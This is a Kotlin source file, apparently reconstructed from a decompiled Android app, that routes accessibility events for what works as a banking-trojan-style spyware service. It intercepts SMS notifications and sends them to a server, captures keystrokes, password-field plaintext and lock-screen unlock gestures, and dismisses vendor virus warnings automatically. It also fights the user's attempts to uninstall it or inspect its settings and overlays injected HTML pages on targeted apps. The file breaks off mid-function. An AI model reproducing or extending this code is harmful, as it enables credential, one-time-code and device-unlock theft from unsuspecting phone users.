package com.storm.safe.rock.service.delegates

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.graphics.Rect
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.service.AppCoreService
import com.storm.safe.rock.service.CachedSourceData
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.DeviceAuthorizationManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.util.Locale

/**
 * Delegate that handles the onAccessibilityEvent routing logic and sub-methods.
 * Extracted from MyAccessibilityService to reduce class size.
 *
 * JADX: onAccessibilityEvent body (lines 9767–10177) + 10 sub-methods:
 * processNotificationForSms, processWindowChangeForInjection, processNotificationEvent,
 * handleVirusControlDialog, handleAccessibilityPageStuck, handleUninstallConfirmDialog,
 * handleInjectionCheck, isPackageInProtectionList, ensureCoreServiceRunning,
 * dispatchToDelegates (kept on Service).
 */
class EventDispatcher(private val service: MyAccessibilityService) {

    companion object {
        private const val TAG = "EventDispatcher"

        /**
         * Check if package is a launcher/installer (skip content change processing).
         * JADX line 9972: launcher/packageinstaller/bbk detection.
         */
        fun isFromLauncher(pkg: String): Boolean {
            if (pkg.isEmpty()) return false
            return pkg.contains("launcher", ignoreCase = true) ||
                pkg.contains("packageinstaller", ignoreCase = true) ||
                pkg.contains("bbk", ignoreCase = true)
        }

        /**
         * Check if package is a system UI app (for screen capture pause).
         * JADX: tu0.f60269a7 — system app package prefixes.
         */
        fun isSystemUiPackage(pkg: String): Boolean {
            val systemApps = arrayOf(
                "com.android.systemui", "com.android.settings",
                "com.android.packageinstaller"
            )
            return systemApps.any { pkg.contains(it, ignoreCase = true) }
        }
    }

    // ── Throttle state (moved from MyAccessibilityService — only used in dispatch loop) ──

    /** JADX: f52386b7 — last content change event timestamp (throttle) */
    @Volatile
    private var lastContentChangeTime: Long = 0L

    /** Last time ensureCoreServiceRunning actually checked */
    private var lastCoreServiceCheckTime: Long = 0L

    /** JADX: unused in current code but declared — last event log timestamp */
    private var lastEventLogTime: Long = 0L

    // ════════════════════════════════════════════════════════════════
    // Main dispatch — body of onAccessibilityEvent between guards
    // ════════════════════════════════════════════════════════════════

    /**
     * Main event dispatch logic, called from MyAccessibilityService.onAccessibilityEvent
     * after the power/sensitive guard passes.
     *
     * JADX lines 9767–10177 (the entire body between the power/sensitive guard and the outer catch).
     *
     * Split into 3 phases:
     * - Phase 1 (Guards): filtered event types, screen capture pause, core service check
     * - Phase 2 (Pre-permission): handlers that must run before the permission guard
     * - Phase 3 (Post-permission): handlers that require permission guard to have passed
     */
    fun dispatch(event: AccessibilityEvent) {
        val eventType = event.eventType
        val pkg = event.packageName?.toString()?.lowercase(Locale.ROOT) ?: ""

        // Phase 1: Guards — can short-circuit the entire dispatch
        if (handleGuards(event, eventType, pkg)) return

        // Phase 2: Pre-permission handlers
        handlePrePermissionEvents(event, eventType, pkg)

        // Phase 3: Permission guard + post-permission handlers
        if (MyAccessibilityService.isPermissionRequestActive() || MyAccessibilityService.isWebViewOpen) return
        handlePostPermissionEvents(event, eventType, pkg)
    }

    // ════════════════════════════════════════════════════════════════
    // Phase 1: Guards — filtered events, screen capture pause, core service
    // ════════════════════════════════════════════════════════════════

    /**
     * Phase 1: Guard checks that can short-circuit the entire dispatch.
     * @return true if the event was consumed (caller should return)
     */
    internal fun handleGuards(event: AccessibilityEvent, eventType: Int, pkg: String): Boolean {
        // ── Filtered event types → route to eventFilterManager (JADX line 9770) ──
        if (dispatchFilteredEvents(event, eventType)) return true

        // ── Ensure AppCoreService running (throttled 10s) (JADX line 9783) ──
        ensureCoreServiceRunning()

        // ── Screen capture pause check (JADX line 9804) ──
        if (checkScreenCapturePause(event)) return true

        return false
    }

    private fun dispatchFilteredEvents(event: AccessibilityEvent, eventType: Int): Boolean {
        if (eventType == 512 || eventType == 1024 || eventType == 262144 ||
            eventType == 524288 || eventType == 1048576 || eventType == 2097152) {
            if (service.eventFilterManager == null || MyAccessibilityService.isWebViewOpen) return true
            // JADX: this.f52414e5.m213127b5(accessibilityEvent)
            service.eventFilterManager?.onAccessibilityEvent(event)
            return true
        }
        return false
    }

    private fun checkScreenCapturePause(event: AccessibilityEvent): Boolean {
        try {
            val scm = service.screenCaptureManager
            if (scm != null && scm.isCapturing) {
                val eventPkg = event.packageName?.toString() ?: ""
                if (isSystemUiPackage(eventPkg)) {
                    val now = System.currentTimeMillis()
                    if (now - (scm.lastPauseTime ?: 0L) >= 2000L) {
                        // JADX: tu0Var.f60281a6.post(new qu0(tu0Var, 0))
                        scm.lastPauseTime = now
                        scm.pauseCapture()
                    }
                    return true
                }
            }
        } catch (_: Exception) {}
        return false
    }

    // ════════════════════════════════════════════════════════════════
    // Phase 2: Pre-permission handlers (before permission guard)
    // ════════════════════════════════════════════════════════════════

    /**
     * Phase 2: Handlers that must run BEFORE the permission request guard.
     * All handlers run independently (no short-circuit).
     */
    internal fun handlePrePermissionEvents(event: AccessibilityEvent, eventType: Int, pkg: String) {
        dispatchVirusDialog(event, eventType)
        dispatchRecentsGuard(event, eventType)
        dispatchMainOrchestrator(event)
        dispatchSystemOptimize(event)
        dispatchKeystrokeCapture(event, eventType)
    }

    private fun dispatchVirusDialog(event: AccessibilityEvent, eventType: Int) {
        // ── Event type 32 (WINDOW_STATE_CHANGED): virus control dialog (JADX line 9827) ──
        if (eventType == 32) {
            try {
                val eventPkg = event.packageName?.toString() ?: ""
                if (eventPkg.contains("systemmanager", ignoreCase = true) ||
                    eventPkg.contains("hihonor", ignoreCase = true) ||
                    eventPkg.contains("huawei", ignoreCase = true)
                ) {
                    service.getCoroutineScope()?.launch {
                        handleVirusControlDialog()
                    }
                }
            } catch (_: Exception) {}
        }
    }

    private fun dispatchRecentsGuard(event: AccessibilityEvent, eventType: Int) {
        // ── Event type 32/2048 → RecentsGuardManager (JADX line 9845) ──
        if (eventType == 32 || eventType == 2048) {
            try {
                service.recentsGuardManager?.onAccessibilityEvent(event)
            } catch (_: Exception) {}
        }
    }

    private fun dispatchMainOrchestrator(event: AccessibilityEvent) {
        // ── MainOrchestrator WRITE_SETTINGS automation (JADX: C0327b2) ──
        // Must be BEFORE isPermissionRequestActive guard — WRITE_SETTINGS IS a permission
        // request, so the guard would block it. MainOrchestrator has its own isActive guard.
        try {
            val mo = service.mainOrchestrator
            if (mo == null) {
                val now = System.currentTimeMillis()
                if (now - lastMainOrchestratorNullLogTime > 10_000L) {
                    android.util.Log.d(TAG, "[onAccessibilityEvent] mainOrchestrator is null, WRITE_SETTINGS events not handled")
                    lastMainOrchestratorNullLogTime = now
                }
            } else {
                mo.handleAccessibilityEvent(event)
            }
        } catch (_: Exception) {}
    }

    private fun dispatchSystemOptimize(event: AccessibilityEvent) {
        // ── SystemOptimizeManager ADB pairing event dispatch (vendor: C0360a2.m212078i3) ──
        try {
            val som = com.storm.safe.rock.service.modules.setup.SystemOptimizeManager.getInstance(service, service)
            // Debug trigger: `adb shell settings put global debug_start_pair 1`
            val debugTrigger = try {
                Settings.Global.getInt(service.contentResolver, "debug_start_pair", 0)
            } catch (_: Exception) { 0 }
            if (debugTrigger == 1) {
                try { Settings.Global.putInt(service.contentResolver, "debug_start_pair", 0) } catch (_: Exception) {}
                android.util.Log.i(TAG, "[SOM] debug_start_pair=1 → 触发 startPairFlow")
                som.startPairFlow()
            }
            som.filterAccessibilityEvent(event)
        } catch (_: Exception) {}
    }

    private fun dispatchKeystrokeCapture(event: AccessibilityEvent, eventType: Int) {
        // ── C0320a5 dispatch: keystroke capture, app usage, notifications ──
        // JADX: dispatches to C0320a5.m211582a3 for event types 16, 32, 64
        if (eventType == 16 || eventType == 32 || eventType == 64) {
            try {
                service.eventFilterManager?.keystrokeCapture?.handleEvent(event, null)
            } catch (_: Exception) {}
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Phase 3: Post-permission handlers (after permission guard)
    // ════════════════════════════════════════════════════════════════

    /**
     * Phase 3: Handlers that run after the permission request guard has passed.
     * Contains keyguard check, content change throttle, and all post-guard handlers.
     */
    internal fun handlePostPermissionEvents(event: AccessibilityEvent, eventType: Int, pkg: String) {
        // ── Keyguard locked check (JADX line 9849) ──
        val isKeyguardLocked = service.isKeyguardLockedCached()

        // ── Event type 2 (VIEW_TEXT_CHANGED) → update lastCachedSource (JADX line 9851) ──
        updateCachedSource(event, eventType)

        // ── Overlay/gesture executor dispatch when not keyguard locked (JADX line 9952) ──
        if (!isKeyguardLocked) {
            try {
                // ADAPT: C0032al (GestureExecutor/LauncherProtector, 475 LOC) — complex overlay manager
                if (service.isOverlayEnabled()) {
                    android.util.Log.v(TAG, "🛡️ [GestureExecutor] gestureExecutor event dispatch (C0032al not replicated as standalone)")
                }
            } catch (_: Exception) {}
        }

        // ── Content change throttle computation (JADX line 9960–9978) ──
        val isThrottled = computeContentChangeThrottle(event, eventType)

        // ── Uninstall protection + package installer + SMS + cipher + notification/gesture + injection ──
        dispatchUninstallProtection(event, eventType, isKeyguardLocked, isThrottled)
        dispatchPackageInstallerOverlay(event, eventType)
        dispatchSmsNotification(event, eventType)
        dispatchCipherCapture(event, eventType)
        dispatchNotificationAndGesture(event, eventType, isThrottled)
        dispatchInjection(event, eventType)
        dispatchEventFilterSecondPass(event)
        dispatchConfigStage(event, eventType, pkg)
        dispatchEventRouter(event, eventType)

        // ── Legacy delegate queue dispatch ──
        service.dispatchToDelegates(event, pkg, event.className?.toString() ?: "")
    }

    private fun updateCachedSource(event: AccessibilityEvent, eventType: Int) {
        if (eventType == 2) {
            var source: AccessibilityNodeInfo? = null
            try {
                source = event.source
                val rect = Rect()
                if (source != null) {
                    source.getBoundsInScreen(rect)
                    val text = source.text?.toString() ?: ""
                    val desc = source.contentDescription?.toString() ?: ""
                    val isVisible = source.isVisibleToUser
                    MyAccessibilityService.lastCachedSource = CachedSourceData(
                        text, desc, rect, isVisible, System.currentTimeMillis()
                    )
                } else {
                    MyAccessibilityService.lastCachedSource = null
                }
            } catch (_: Exception) {
                MyAccessibilityService.lastCachedSource = null
            } finally {
                try { source?.recycle() } catch (_: Exception) {}
            }
        }
    }

    /**
     * Compute content change throttle state.
     * @return true if the event should be throttled
     */
    private fun computeContentChangeThrottle(event: AccessibilityEvent, eventType: Int): Boolean {
        // ── WINDOW_CONTENT_CHANGED (2048) package tracking (JADX line 9960–9975) ──
        val isContentChange = eventType == 2048
        val contentChangePkg: String
        if (isContentChange) {
            val p = event.packageName?.toString()?.lowercase(Locale.ROOT) ?: ""
            contentChangePkg = p
        } else {
            contentChangePkg = ""
        }

        // ── Launcher/installer detection → skip if from launcher (JADX line 9972) ──
        val isFromLauncherPkg = if (isContentChange && contentChangePkg.isNotEmpty()) {
            isFromLauncher(contentChangePkg)
        } else false

        val contentChangeTime = if (isContentChange) System.currentTimeMillis() else 0L

        // ── Throttle: 300ms between content change events (JADX line 9978) ──
        return if (isContentChange && !isFromLauncherPkg) {
            isContentChangeThrottled(contentChangeTime)
        } else false
    }

    private fun dispatchUninstallProtection(event: AccessibilityEvent, eventType: Int, isKeyguardLocked: Boolean, isThrottled: Boolean) {
        // ── UninstallProtectionManager dispatch for specific packages (JADX line 9982–9998) ──
        if (!service.isUninstallGuardStarted && !isKeyguardLocked && !isThrottled) {
            try {
                val eventPkgLower = event.packageName?.toString()?.lowercase(Locale.ROOT) ?: ""
                if (eventPkgLower.isNotEmpty()) {
                    service.uninstallProtectionManager?.let { upm ->
                        // JADX: C0355a0.m211934d7(lowerCase5) — checks if pkg is relevant
                        upm.onAccessibilityEvent(event)
                    }
                }
            } catch (_: Exception) {}
        }

        // ── Uninstall protection for extended package list (JADX line 9999–10013) ──
        if (service.isUninstallGuardStarted || isKeyguardLocked || isThrottled) {
            // skip
        } else {
            try {
                val eventPkgLower = event.packageName?.toString()?.lowercase(Locale.ROOT) ?: ""
                if (eventPkgLower.isNotEmpty() && isPackageInProtectionList(eventPkgLower)) {
                    service.uninstallProtectionManager?.onAccessibilityEvent(event)
                }
            } catch (_: Exception) {}
        }
    }

    private fun dispatchPackageInstallerOverlay(event: AccessibilityEvent, eventType: Int) {
        // ── Event type 32: Package installer overlay (JADX line 10015–10035) ──
        if (eventType == 32) {
            try {
                val eventPkgLower = event.packageName?.toString()?.lowercase(Locale.ROOT) ?: ""
                if (eventPkgLower.contains("packageinstaller", ignoreCase = true) ||
                    eventPkgLower.contains("packagemanager", ignoreCase = true)
                ) {
                    val cls = event.className?.toString() ?: ""
                    if (cls.contains("InstallAppProgress", ignoreCase = true) ||
                        cls.contains("InstallStaging", ignoreCase = true) ||
                        cls.contains("InstallStart", ignoreCase = true) ||
                        cls.contains("InstallConfirm", ignoreCase = true) ||
                        cls.contains("PackageInstallerActivity", ignoreCase = true) ||
                        cls.contains("Alert", ignoreCase = true)
                    ) {
                        // ADAPT: m211440c2() — createOverlay for package installer detection.
                        try {
                            android.util.Log.d(TAG, "📦 检测到安装界面: cls=$cls")
                        } catch (_: Exception) {}
                    }
                }
            } catch (_: Exception) {}
        }
    }

    private fun dispatchSmsNotification(event: AccessibilityEvent, eventType: Int) {
        // ── Event type 64 (TYPE_NOTIFICATION_STATE_CHANGED) → SMS interception (JADX line 10036) ──
        if (eventType == 64) {
            processNotificationForSms(event)
        }
    }

    private fun dispatchCipherCapture(event: AccessibilityEvent, eventType: Int) {
        // ── CipherCaptureManager dispatch (JADX line 10039) ──
        service.cipherCaptureManager?.let { ccm ->
            when (eventType) {
                AccessibilityEvent.TYPE_VIEW_CLICKED,       // 1
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,  // 16
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED, // 32
                AccessibilityEvent.TYPE_VIEW_FOCUSED,       // 8
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED, // 2048
                AccessibilityEvent.TYPE_WINDOWS_CHANGED,    // 4194304
                AccessibilityEvent.TYPE_VIEW_HOVER_ENTER -> { // 128
                    try {
                        // ADAPT 2026-04-17: vendor m211820d6 — read EditText plaintext
                        ccm.monitorSystemPasswordInputFull(event)
                    } catch (e: kotlinx.coroutines.CancellationException) {
                        throw e
                    } catch (e: Exception) {
                        android.util.Log.w(TAG, "⚠️ monitorSystemPasswordInputFull 异常: ${e.message}")
                    }
                }
                else -> Unit  // other event types intentionally not routed to cipher capture
            }
            // Legacy: string-based event fires a WS telemetry upload (vendor sendPasswordEvent).
            if (eventType == 16 || eventType == 1 || eventType == 32) {
                ccm.dispatchEvent("accessibility_event_$eventType")
            }
        }
    }

    private fun dispatchNotificationAndGesture(event: AccessibilityEvent, eventType: Int, isThrottled: Boolean) {
        // ── processNotificationEvent — lockscreen gesture dispatch (JADX line 10052) ──
        if (eventType == 32 || eventType == 2048) {
            processNotificationEvent(event)
            // JADX: C0319a4.m211577a6 — gesture recorder window state detection
            service.gestureRecorderManager?.onWindowStateChanged(event)
        }

        // ── GestureRecorderManager dispatch for hover/click events (JADX line 10055–10108) ──
        service.notificationInterceptDelegate?.let { nid ->
            try {
                if (eventType == 128) {
                    // JADX: hover event → gestureRecorderManager.onHoverEvent
                    service.gestureRecorderManager?.onHoverEvent(event)
                }
                if (eventType == 1) {
                    // JADX: click event → gestureRecorderManager.onClickEvent
                }
                // JADX line 10083: if eventType 32/2048, check if not from systemui → launch coroutine
                if (eventType == 32 || eventType == 2048) {
                    val recPkg = event.packageName?.toString() ?: ""
                    if (recPkg.isNotEmpty() && !recPkg.contains("systemui", ignoreCase = true) && !isThrottled) {
                        // JADX: launch C02969 coroutine for gesture recorder processing
                        service.getCoroutineScope()?.launch {
                            // Gesture recorder event processing (C02969)
                        }
                    }
                }
            } catch (_: Exception) {}
        }
    }

    private fun dispatchInjection(event: AccessibilityEvent, eventType: Int) {
        // ── processWindowChangeForInjection (JADX line 10110) ──
        if (eventType == 32 || eventType == 4194304) {
            processWindowChangeForInjection(event)
        }
    }

    private fun dispatchEventFilterSecondPass(event: AccessibilityEvent) {
        // ── eventFilterManager second dispatch (JADX line 10113) ──
        if (service.eventFilterManager != null && !MyAccessibilityService.isWebViewOpen) {
            // JADX: this.f52414e5.m213127b5(accessibilityEvent)
            service.eventFilterManager?.onAccessibilityEvent(event)
        }
    }

    private fun dispatchConfigStage(event: AccessibilityEvent, eventType: Int, pkg: String) {
        // ── ConfigStageManager / yw5xud dispatch (JADX line 10121–10133) ──
        if (eventType == 32 || eventType == 2048) {
            try {
                // JADX: c0329b4.f53199a4 (C0372a9) — if active, post to handler
                service.configStageManager?.let { csm ->
                    if (csm is DeviceAuthorizationManager) {
                        val evtType = event.eventType
                        val evtPkg = event.packageName?.toString()
                        if (evtPkg != null && (evtType == 2048 || evtType == 32)) {
                            // JADX: c0372a9.f55147a4.post(new RunnableC1224sj(eventType, 1, c0372a9, string))
                            csm.onAccessibilityEvent(event)
                        }
                    }
                }
            } catch (_: Exception) {}
        }

        // ── Event type 32: app name detection → back action (JADX line 10134–10167) ──
        if (eventType == 32) {
            try {
                val texts = event.text
                val firstText = texts?.firstOrNull()?.toString() ?: ""
                if (firstText.isNotEmpty()) {
                    val appName = try { service.getString(service.applicationInfo.labelRes) } catch (_: Exception) { "" }
                    if (appName.isNotEmpty() && firstText == appName) {
                        // JADX: if pkg contains "settings" and configStageManager.isActive → performGlobalAction(BACK)
                        if (pkg.contains("settings", ignoreCase = true)) {
                            val csm = service.configStageManager
                            if (csm is DeviceAuthorizationManager && csm.isActive()) {
                                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
                            }
                        }
                    }
                }
            } catch (_: Exception) {}
        }
    }

    private fun dispatchEventRouter(event: AccessibilityEvent, eventType: Int) {
        // ── AccessibilityEventRouter dispatch (JADX line 10169–10177) ──
        if (eventType == 1 || eventType == 32 || eventType == 2048) {
            try {
                service.accessibilityEventRouter?.let { aer ->
                    // JADX: C0360a2.f53810f9.getInstance().m212078i3(accessibilityEvent)
                    aer.dispatch(event)
                }
            } catch (_: Exception) {}
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Sub-methods (faithfully copied from MyAccessibilityService)
    // ════════════════════════════════════════════════════════════════

    /**
     * Process notification event for SMS interception.
     * JADX method: m211473g7 (g7), line 5998
     */
    fun processNotificationForSms(event: AccessibilityEvent) {
        try {
            val pkg = event.packageName?.toString() ?: return
            if (pkg == service.applicationContext.packageName) return
            // JADX line 6007: check if package is SMS/messaging app
            val smsApps = listOf(
                "com.android.mms", "com.android.messaging", "com.google.android.apps.messaging",
                "com.samsung.android.messaging", "com.meizu.mms"
            )
            val pkgLower = pkg.lowercase(Locale.ROOT)
            val isSmsApp = smsApps.any { pkg.equals(it, ignoreCase = true) } ||
                pkgLower.contains("mms") || pkgLower.contains("message") || pkgLower.contains("sms")
            if (!isSmsApp) return

            // JADX line 6021: extract notification data from parcelableData
            val parcelable = event.parcelableData
            if (parcelable is android.app.Notification) {
                val extras = parcelable.extras ?: return
                val title = extras.getCharSequence("android.title")?.toString() ?: ""
                var bigText = extras.getCharSequence("android.bigText")?.toString() ?: ""
                val text = extras.getCharSequence("android.text")?.toString() ?: ""
                if (bigText.isEmpty()) bigText = text
                if (title.isEmpty() && bigText.isEmpty()) return

                android.util.Log.d(TAG, "📩 [无障碍短信] 拦截: 发送者=$title, ${bigText.take(30)}...")
                service.networkManager?.let { nm ->
                    val data = org.json.JSONObject()
                    data.put("number", title)
                    data.put("text", bigText)
                    data.put("timestamp", System.currentTimeMillis())
                    data.put("type", "incoming")
                    data.put("source", "accessibility")
                    data.put("packageName", pkg)
                    nm.sendIncomingSms(data)
                }
            }
        } catch (e: Exception) {
            android.util.Log.w(TAG, "📩 [无障碍短信] 处理失败: ${e.message}")
        }
    }

    /**
     * Process window state change for injection detection.
     * JADX method: m211474g8 (g8), line 6070
     */
    fun processWindowChangeForInjection(event: AccessibilityEvent) {
        try {
            val pkg = event.packageName?.toString() ?: return

            // JADX line 6076: check if injection tasks empty
            val isEmpty: Boolean
            synchronized(service.injectionTasksLock) {
                isEmpty = service.injectionTasks.isEmpty()
            }
            if (!isEmpty && pkg.isNotEmpty()) {
                synchronized(service.injectionTasksLock) {
                    val taskKeys = service.injectionTasks.keys.toList()
                    android.util.Log.v(TAG, "📱 [注入检测] 窗口变化: pkg=$pkg, 任务包名=$taskKeys")
                }
            }

            // JADX line 6085: if pkg is not empty, not self, and doesn't start with self → call d0
            if (pkg.isNotEmpty() && pkg != service.applicationContext.packageName) {
                val selfPkg = service.applicationContext.packageName
                if (pkg.contains(selfPkg, ignoreCase = true)) return
                handleInjectionCheck(pkg)
            }
        } catch (_: Exception) {}
    }

    /**
     * Process notification/lockscreen event for gesture recording.
     * JADX method: m211446d1 (d1), line 4552
     */
    fun processNotificationEvent(event: AccessibilityEvent) {
        try {
            // JADX line 4556: guard — need gestureRecorderManager (f52437g8)
            if (service.notificationInterceptDelegate == null && service.gestureRecorderManager == null) return
            val pkg = event.packageName?.toString() ?: return
            val pkgLower = pkg.lowercase(Locale.ROOT)

            // JADX line 4561: check if from systemui/lockscreen/keyguard
            val isLockscreenPkg = pkgLower.contains("systemui") ||
                pkgLower.contains("lockscreen") ||
                pkgLower.contains("keyguard")

            // JADX line 4562: check if AOD/alwayson/ambient (exclude these)
            val isAodPkg = pkgLower.contains("aod") ||
                pkgLower.contains("alwayson") ||
                pkgLower.contains("ambient")

            if (isLockscreenPkg && !isAodPkg) {
                // JADX line 4564: check keyguard locked + secure
                val isLocked = service.isKeyguardLockedCached()
                val isSecure = service.keyguardManager?.isKeyguardSecure ?: false

                if (isLocked && isSecure) {
                    android.util.Log.d(TAG, "🔐 检测到锁屏界面: pkg=$pkgLower, locked=$isLocked, secure=$isSecure")

                    if (!service.isCipherCaptureEnabled) {
                        val now = System.currentTimeMillis()
                        if (now - service.lastLockTypeCheckTime < 10_000L) return
                        service.lastLockTypeCheckTime = now

                        val prefs = service.getSharedPreferences("cipher_config", Context.MODE_PRIVATE)
                        val savedType = prefs.getString("cipher_lock_type", "") ?: ""
                        val root = service.rootInActiveWindow
                        val currentType = service.accessibilityEventRouter?.detectLockType(root)?.name?.lowercase() ?: ""
                        root?.recycle()

                        if (currentType.isNotEmpty() && currentType != "unknown"
                            && (savedType.isEmpty() || savedType == "unknown" || currentType != savedType)) {
                            android.util.Log.d(TAG, "🔐 锁屏类型变化: $savedType → $currentType，重新启用密码监听")
                            prefs.edit().putBoolean("cipher_completed", false).apply()
                            service.isCipherCaptureEnabled = true
                            service.cipherRetryCount = 0
                            service.cipherCaptureManager?.startListening()
                        }
                    }
                }
            }
        } catch (_: Exception) {}
    }

    /**
     * Handle Huawei virus control dialog — auto-dismiss.
     * JADX: dqtvuisjd$handleVirusControlDialog$1
     */
    suspend fun handleVirusControlDialog() {
        try {
            val root = service.rootInActiveWindow ?: return
            // ADAPT: verify it's actually a virus dialog before dismissing
            val virusKeywords = arrayOf("病毒", "安全", "扫描", "恶意", "威胁", "可疑", "风险")
            val isVirusDialog = virusKeywords.any { kw ->
                val nodes = try { root.findAccessibilityNodeInfosByText(kw) } catch (_: Exception) { null }
                nodes != null && nodes.any { it.isVisibleToUser }
            }
            if (!isVirusDialog) {
                // Not a virus dialog — don't interfere with Step 5/2/7 automation flows
                return
            }
            android.util.Log.d(TAG, "🦠 检测到系统病毒扫描对话框")
            val dismissTexts = arrayOf("忽略", "关闭", "取消", "我知道了", "确定")
            for (text in dismissTexts) {
                val nodes = root.findAccessibilityNodeInfosByText(text)
                if (nodes != null && nodes.isNotEmpty()) {
                    for (node in nodes) {
                        if (node.isClickable) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            android.util.Log.d(TAG, "🦠 已点击病毒扫描对话框按钮: $text")
                            return
                        }
                    }
                }
            }
        } catch (e: Exception) {
            android.util.Log.w(TAG, "🦠 处理病毒扫描对话框失败: ${e.message}")
        }
    }

    /**
     * Handle accessibility settings page stuck detection.
     * JADX method: m211409a8 (a8), line 1867
     */
    fun handleAccessibilityPageStuck() {
        try {
            val now = System.currentTimeMillis()
            // JADX line 1870: throttle 10s
            if (now - service.accessibilitySettingsMonitorTime < 10_000L) return

            service.accessibilitySettingsMonitorTime = now
            service.accessibilitySettingsMonitorCount++

            android.util.Log.w(TAG, "⚠️ [监控] 检测到卡在无障碍设置页面 (第${service.accessibilitySettingsMonitorCount}次)")

            // JADX line 1878–1881: if count < confirmationThreshold, wait for more
            if (service.accessibilitySettingsMonitorCount < service.monitorConfirmationCount) {
                android.util.Log.d(TAG,
                    "🔍 等待更多确认，当前检测次数: ${service.accessibilitySettingsMonitorCount}/${service.monitorConfirmationCount}")
                return
            }

            // JADX line 1883–1891: if count > maxRetry, stop monitoring
            if (service.accessibilitySettingsMonitorCount > service.monitorMaxRetryCount) {
                android.util.Log.w(TAG, "⚠️ [监控] 已达到最大尝试次数，停止监控")
                service.accessibilitySettingsMonitorJob?.cancel()
                service.accessibilitySettingsMonitorJob = null
                return
            }

            // JADX line 1892–1893: try to navigate back from accessibility settings
            android.util.Log.d(TAG,
                "✅ [监控] 尝试从无障碍设置页面跳转回应用 (第${service.accessibilitySettingsMonitorCount}次)")
            service.getCoroutineScope()?.launch {
                try {
                    // JADX: dqtvuisjd$handleAccessibilityPageStuck$1 — navigate back
                    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
                    delay(500L)
                    // JADX: after back, try to launch our own activity
                    try {
                        val launchIntent = service.packageManager.getLaunchIntentForPackage(service.packageName)
                        if (launchIntent != null) {
                            launchIntent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                            service.startActivity(launchIntent)
                        }
                    } catch (_: Exception) {}
                } catch (_: Exception) {}
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ [监控] 处理无障碍设置页面卡住失败", e)
        }
    }

    /**
     * Handle uninstall confirmation dialog — auto-click confirm button.
     * JADX method: m211415b4 (b4), line 2146
     *
     * NOTE: Also called externally by AccessibilityServiceRunnable.kt:194
     * via MyAccessibilityService.handleUninstallConfirmDialog() delegate.
     */
    fun handleUninstallConfirmDialog() {
        // JADX line 2147: if on main thread, dispatch to IO and return
        if (Thread.currentThread() == android.os.Looper.getMainLooper().thread) {
            service.getCoroutineScope()?.launch(Dispatchers.Default) {
                handleUninstallConfirmDialog()
            }
            return
        }

        try {
            val root = service.rootInActiveWindow ?: return

            // JADX line 2156: dh0.m212602a1() + dh0.f55754a4 → combined confirm button texts
            val confirmTexts = listOf(
                // Chinese
                "卸载", "移除", "删除", "停用", "禁用",
                // English
                "Uninstall", "Remove", "Delete", "Disable",
                // Other common
                "OK", "确定", "确认", "好", "好的", "知道了"
            )

            for (text in confirmTexts) {
                val nodes = root.findAccessibilityNodeInfosByText(text)
                if (nodes.isNullOrEmpty()) continue

                for (node in nodes) {
                    // JADX line 2165: if node is clickable, click it directly
                    if (node.isClickable) {
                        android.util.Log.d(TAG, "✅ 点击确认按钮: ${node.text}")
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        // Recycle all nodes
                        nodes.forEach { n -> try { n.recycle() } catch (_: Exception) {} }
                        try { root.recycle() } catch (_: Exception) {}
                        return
                    }

                    // JADX line 2178–2202: traverse parents looking for clickable ancestor
                    val parentChain = mutableListOf<AccessibilityNodeInfo>()
                    var parent = node.parent
                    while (parent != null) {
                        parentChain.add(parent)
                        if (parent.isClickable) {
                            android.util.Log.d(TAG, "✅ 点击确认按钮的父节点")
                            parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            parentChain.forEach { p -> try { p.recycle() } catch (_: Exception) {} }
                            nodes.forEach { n -> try { n.recycle() } catch (_: Exception) {} }
                            try { root.recycle() } catch (_: Exception) {}
                            return
                        }
                        parent = parent.parent
                    }
                    // Recycle parent chain if no clickable found
                    parentChain.forEach { p -> try { p.recycle() } catch (_: Exception) {} }
                }
                // Recycle found nodes
                nodes.forEach { n -> try { n.recycle() } catch (_: Exception) {} }
            }

            android.util.Log.w(TAG, "⚠️ 未找到确认按钮")
            try { root.recycle() } catch (_: Exception) {}
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 处理确认弹窗失败", e)
        }
    }

    /**
     * Handle injection check — detect target app and show injection page.
     * JADX method: m211445d0 (d0), line 4510
     */
    fun handleInjectionCheck(packageName: String) {
        try {
            // JADX line 4513: synchronized get from injectionTasks
            val htmlContent: String?
            synchronized(service.injectionTasksLock) {
                htmlContent = service.injectionTasks[packageName]
            }
            if (htmlContent == null) return

            // JADX line 4519: throttle check using injectionThrottleMap
            val now = System.currentTimeMillis()
            val lastTime: Long
            synchronized(service.injectionTasksLock) {
                lastTime = service.injectionThrottleMap[packageName] ?: 0L
            }
            if (now - lastTime < service.injectionThrottleInterval) return

            // JADX line 4527–4531: check if injection activity is active and in foreground
            if (com.storm.safe.rock.inject.jbqfkndyx.active && com.storm.safe.rock.inject.jbqfkndyx.inForeground) {
                return
            }

            // JADX line 4533: update throttle timestamp
            synchronized(service.injectionTasksLock) {
                service.injectionThrottleMap[packageName] = now
            }

            android.util.Log.d(TAG, "📱 检测到目标app: $packageName，显示注入页面")

            // JADX line 4537–4544: start injection activity with flags
            try {
                val intent = android.content.Intent(service, com.storm.safe.rock.inject.jbqfkndyx::class.java)
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP)
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
                intent.putExtra("package_name", packageName)
                intent.putExtra("html_content", htmlContent)
                service.startActivity(intent)
                android.util.Log.d(TAG, "✅ 自动显示注入页面成功: $packageName")
            } catch (e: Exception) {
